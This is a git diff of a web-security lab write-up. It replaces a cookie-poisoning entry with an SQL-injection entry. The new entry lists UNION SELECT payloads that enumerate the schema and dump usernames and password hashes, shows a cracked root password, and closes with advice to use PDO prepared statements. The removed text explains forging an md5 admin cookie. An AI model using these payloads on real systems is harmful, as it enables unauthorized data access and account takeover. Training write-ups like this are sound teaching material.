@@ -1,14 +1,38 @@
-# Cookie poisoning
+# SQL Admin Connection
 
-df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
+`B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2`
+
+---
 
 ## Description
 
-There is a cookie named I_am_admin, its default value is "false" encrypted in md5.
-In order to get the access as admin, you can change the value of the cookie to "true" encrypted in md5.
+go to `/?page=member`
 
+submit : 
+- `1 AND 1=2 UNION SELECT column_name , 1 FROM information_schema.columns`
+- `1 AND 1=2 UNION SELECT table_name , 1 FROM information_schema.columns `
+- `1 AND 1=2 UNION SELECT table_schema, 1 FROM information_schema.tables`
+
+then : \
+`1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default`
+
+password = 3bf1114a986ba87ed28fc1b5884fc2f8  =>  "shadow"
+
+then go to `/index.php?page=signin`
+
+login :	`root`\
+mdp :	`shadow`
+
+---
 
 ## How to prevent it ?
 
-To check the roles of a user on a website, a good solution would be to use JSON Web Tokens.
-The token is generated and signed by the server after the user's authentication, and sent to the  client. Afterwards the token is sent back to the server with each request needing specific rights, and the server checks if it is valid (it hasn't been manipulated or hasn't expired) before sending a response.
+In the case of a php back-end, use PDO :
+- The query will be sanitized with the `prepare` statement
+- It will then be executed with the `execute` statement once the risk of an undesired effect is avoided
+
+Here is a more detailed explanation found on SO regarding the `prepare` command :
+
+>"The SQL statement you pass to prepare is parsed and compiled by the database server. By specifying parameters (either a ? or a named parameter like :name in the example above) you tell the database engine where you want to filter on. Then when you call execute, the prepared statement is combined with the parameter values you specify.
+
+>The important thing here is that the parameter values are combined with the compiled statement, not an SQL string. SQL injection works by tricking the script into including malicious strings when it creates SQL to send to the database. So by sending the actual SQL separately from the parameters, you limit the risk of ending up with something you didn't intend."
